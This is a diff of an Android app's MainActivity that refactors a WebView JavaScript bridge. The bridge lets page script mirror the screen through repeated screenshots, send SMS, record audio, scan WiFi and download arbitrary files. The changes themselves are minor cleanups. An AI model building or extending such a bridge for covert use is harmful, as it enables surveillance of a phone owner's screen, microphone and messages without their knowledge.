@@ -58,7 +58,6 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
@@ -69,11 +68,6 @@ import java.util.Date;
 import java.util.Enumeration;
 import java.util.List;
 import java.util.Locale;
-import java.util.concurrent.TimeUnit;
-
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -94,7 +88,6 @@ public class MainActivity extends AppCompatActivity {
 
         webView = findViewById(R.id.webView);
 
-        // Setup WebView
         WebSettings settings = webView.getSettings();
         settings.setJavaScriptEnabled(true);
         settings.setDomStorageEnabled(true);
@@ -107,13 +100,10 @@ public class MainActivity extends AppCompatActivity {
         webView.setWebViewClient(new WebViewClient());
         webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
 
-        // Load device.html from assets
         webView.loadUrl("file:///android_asset/device.html");
 
-        // Request permissions
         requestPermissionsIfNeeded();
 
-        // Init camera
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
         try {
             for (String id : cameraManager.getCameraIdList()) {
@@ -127,7 +117,7 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
 
-        Log.d("FXTP", "App started with WebView bridge");
+        Log.d("FXTP", "App started");
     }
 
     // ==================== ANDROID BRIDGE ====================
@@ -138,7 +128,6 @@ public class MainActivity extends AppCompatActivity {
             Log.d("FXTP", msg);
         }
 
-        // --- Ping ---
         @JavascriptInterface
         public String ping() {
             return "pong";
@@ -168,14 +157,11 @@ public class MainActivity extends AppCompatActivity {
             if (isMirroring) return "Already mirroring";
             isMirroring = true;
             mirrorHandler = new Handler();
-            mirrorRunnable = new Runnable() {
-                @Override
-                public void run() {
-                    if (!isMirroring) return;
-                    String result = takeScreenshot();
-                    webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('mirror_frame', '" + result.replace("\\", "\\\\").replace("'", "\\'") + "');");
-                    mirrorHandler.postDelayed(this, 200);
-                }
+            mirrorRunnable = () -> {
+                if (!isMirroring) return;
+                String result = takeScreenshot();
+                webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('mirror_frame', '" + result.replace("\\", "\\\\").replace("'", "\\'") + "');");
+                mirrorHandler.postDelayed(mirrorRunnable, 200);
             };
             mirrorHandler.post(mirrorRunnable);
             return "Mirror started";
@@ -184,9 +170,7 @@ public class MainActivity extends AppCompatActivity {
         @JavascriptInterface
         public String stopMirror() {
             isMirroring = false;
-            if (mirrorHandler != null) {
-                mirrorHandler.removeCallbacks(mirrorRunnable);
-            }
+            if (mirrorHandler != null) mirrorHandler.removeCallbacks(mirrorRunnable);
             return "Mirror stopped";
         }
 
@@ -315,9 +299,9 @@ public class MainActivity extends AppCompatActivity {
 
         // --- SMS ---
         @JavascriptInterface
-        public String sendSms(String msg) {
+        public String sendSms(String data) {
             try {
-                String[] parts = msg.split("\\|");
+                String[] parts = data.split("\\|");
                 if (parts.length < 2) return "Format: number|message";
                 String number = parts[0].trim();
                 String message = parts[1].trim();
@@ -389,7 +373,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Audio Recording ---
+        // --- Audio ---
         @JavascriptInterface
         public String startAudioRecording(int duration) {
             try {
@@ -401,10 +385,7 @@ public class MainActivity extends AppCompatActivity {
                 audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                 audioRecorder.prepare();
                 audioRecorder.start();
-                // Schedule stop after duration
-                mainHandler.postDelayed(() -> {
-                    stopAudioRecording();
-                }, duration * 1000L);
+                mainHandler.postDelayed(() -> stopAudioRecording(), duration * 1000L);
                 return "Recording started for " + duration + "s";
             } catch (Exception e) {
                 return "ERROR: " + e.getMessage();
@@ -503,7 +484,7 @@ public class MainActivity extends AppCompatActivity {
                 return "ERROR: " + e.getMessage();
             }
         }
-        
+
         // --- WiFi ---
         @JavascriptInterface
         public String scanWifi() {
@@ -558,7 +539,7 @@ public class MainActivity extends AppCompatActivity {
         public String setBrightness(int value) {
             try {
                 WindowManager.LayoutParams lp = getWindow().getAttributes();
-                lp.screenBrightness = value / 100f;
+                lp.screenBrightness = Math.max(0.01f, Math.min(1f, value / 100f));
                 getWindow().setAttributes(lp);
                 return "Set to " + value + "%";
             } catch (Exception e) {
@@ -573,7 +554,7 @@ public class MainActivity extends AppCompatActivity {
                 android.media.AudioManager am = (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
                 if (am != null) {
                     int max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
-                    am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, value * max / 100, 0);
+                    am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, Math.min(max, value * max / 100), 0);
                     return "Set to " + value + "%";
                 }
                 return "AudioManager not available";
@@ -588,6 +569,8 @@ public class MainActivity extends AppCompatActivity {
             try {
                 URL url = new URL(urlStr);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setConnectTimeout(15000);
+                conn.setReadTimeout(15000);
                 conn.connect();
                 InputStream in = conn.getInputStream();
                 File outFile = new File(getExternalFilesDir(null), "downloaded_file");
@@ -690,4 +673,4 @@ public class MainActivity extends AppCompatActivity {
             audioRecorder = null;
         }
     }
-        }
+                    }
